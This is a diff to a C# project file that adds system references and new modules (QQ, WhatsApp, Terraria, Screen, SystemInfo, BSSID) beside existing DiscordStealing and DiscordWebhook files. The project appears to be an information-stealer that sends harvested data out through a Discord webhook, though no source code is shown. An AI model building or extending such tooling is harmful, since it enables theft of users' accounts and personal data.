@@ -54,9 +54,11 @@
     </Reference>
     <Reference Include="System" />
     <Reference Include="System.Core" />
+    <Reference Include="System.Management" />
     <Reference Include="System.Net.Http.Formatting, Version=5.2.7.0, Culture=neutral, PublicKeyToken=31bf3856ad364e35, processorArchitecture=MSIL">
       <HintPath>..\packages\Microsoft.AspNet.WebApi.Client.5.2.7\lib\net45\System.Net.Http.Formatting.dll</HintPath>
     </Reference>
+    <Reference Include="System.Security" />
     <Reference Include="System.Xml.Linq" />
     <Reference Include="System.Data.DataSetExtensions" />
     <Reference Include="Microsoft.CSharp" />
@@ -68,12 +70,24 @@
     <Reference Include="System.Xml" />
   </ItemGroup>
   <ItemGroup>
+    <Compile Include="BSSID.cs" />
+    <Compile Include="Buffer.cs" />
+    <Compile Include="Counter.cs" />
     <Compile Include="Discord.cs" />
     <Compile Include="DiscordStealing.cs" />
     <Compile Include="DiscordWebhook.cs" />
     <Compile Include="Growtopia.cs" />
+    <Compile Include="Help.cs" />
+    <Compile Include="Paths.cs" />
     <Compile Include="Program.cs" />
     <Compile Include="Properties\AssemblyInfo.cs" />
+    <Compile Include="QQ.cs" />
+    <Compile Include="Screen.cs" />
+    <Compile Include="SystemInfo.cs" />
+    <Compile Include="Terraria.cs" />
+    <Compile Include="Visual Studio.cs" />
+    <Compile Include="WhatsApp.cs" />
+    <Compile Include="WinAPI.cs" />
     <EmbeddedResource Include="Properties\Resources.resx">
       <Generator>ResXFileCodeGenerator</Generator>
       <LastGenOutput>Resources.Designer.cs</LastGenOutput>
